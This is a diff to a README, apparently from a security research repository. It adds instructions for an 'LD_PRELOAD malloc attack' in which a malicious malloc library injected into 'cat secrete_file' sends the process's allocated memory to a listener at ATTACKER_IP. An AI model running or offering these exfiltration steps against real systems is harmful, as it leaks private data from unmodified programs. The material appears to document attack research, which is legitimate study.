@@ -41,3 +41,21 @@ For that, you should modify the following lines of `victim.cpp`:
  // change to true to use implicit ODP.
   bool useodp = false;
 ```
+
+## LD_PRELOAD malloc attack
+
+This attack should send all the allocated memory
+information of an unmodified binary to an
+attacker.
+
+First run the attacker:
+```
+make
+./attacker -a ATTACKER_IP
+```
+
+Then run the victim program with malicious malloc library:
+```
+make
+LD_PRELOAD=./malmalloc.so cat secrete_file
+```
